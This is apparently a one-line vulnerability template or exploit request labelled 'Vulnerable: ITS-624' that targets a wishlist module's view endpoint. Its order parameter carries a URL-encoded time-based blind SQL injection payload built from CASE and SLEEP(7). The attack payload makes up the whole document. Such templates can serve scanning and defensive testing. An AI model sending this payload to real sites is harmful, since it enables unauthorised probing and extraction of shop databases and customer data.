# Vulnerable: ITS-624
GET /module/blockwishlist/view?id_wishlist={{id_wishlist_raw}}&order=p.name,%20(select%20case%20when%20(1=1)%20then%20(SELECT%20SLEEP(7))%20else%201%20end);%20--%20.asc
